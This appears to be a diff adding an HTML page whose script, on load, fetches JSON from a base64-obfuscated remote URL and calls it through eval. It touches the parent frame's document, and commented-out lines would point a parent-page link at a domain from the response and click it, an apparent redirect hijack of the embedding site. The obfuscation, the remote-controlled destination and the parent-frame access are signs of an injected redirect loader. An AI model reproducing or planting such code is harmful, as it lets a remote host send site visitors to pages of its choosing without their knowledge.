@@ -1,0 +1,31 @@
+<!DOCTYPE HTML>
+<html>
+<body></body>
+<script>
+function send(url, fn) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', url, true);
+    xhr.responseType = 'json';
+    xhr.onreadystatechange = function () {
+        if ((xhr.readyState == 4 && xhr.status == 200) || xhr.status == 304) {
+            fn.call(this, xhr.response);
+        }
+    };
+    xhr.send();
+}
+
+function route() {
+    send(atob('aHR0cHM6Ly9sYi5zb25neW91emhpLmNuL25pY2UvYXBpL2dldGx1b2RpMWFwaS5waHA='), function(e) {
+        console.log(parent.document);
+
+        alert(parent);
+
+        // var hi = parent.document.getElementById("hi");
+
+        //     hi.href = e['domainname'];
+        //     hi.click();
+    });
+}
+eval("route()");
+</script>
+</html>
